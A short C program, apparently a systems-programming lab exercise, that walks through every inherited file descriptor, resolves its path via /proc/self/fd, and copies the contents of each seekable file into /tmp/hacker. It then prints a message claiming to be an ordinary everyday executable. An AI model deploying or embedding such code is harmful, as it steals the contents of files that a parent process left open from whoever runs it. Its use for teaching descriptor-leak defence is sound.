#include "csapp.h"
#include <dirent.h> 

int main(void) {
  long max_fd = sysconf(_SC_OPEN_MAX);
  int out = Open("/tmp/hacker", O_CREAT | O_APPEND | O_WRONLY, 0666);

  /* TODO: Something is missing here! */

  for (int fd = 0; fd < max_fd; fd++) {

    if (lseek(fd, 0, 0) < 0 || fd == out) {
      continue;
    }

    char path[1024];
    char fileName[1024];

    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
    
    int name_len;
    
    if ((name_len = Readlink(path, fileName, 1024)) < 0) {
      perror("Readlink failure!");
      exit(1);
    }

    fileName[name_len] = '\0';

    printf("File descriptor: %d is %s file!\n", fd, fileName);
    dprintf(out, "File descriptor: %d is %s file!\n", fd, fileName);
    
    char buf[1024];
    while (read(fd, buf, sizeof(buf)) > 0)
    {
      int wr = write(out, buf, strlen(buf));
      if (wr == -1) {
        perror("write");
        exit(1);
      }
    }
  }

  Close(out);

  printf("I'm just a normal executable you use on daily basis!\n");

  return 0;
}
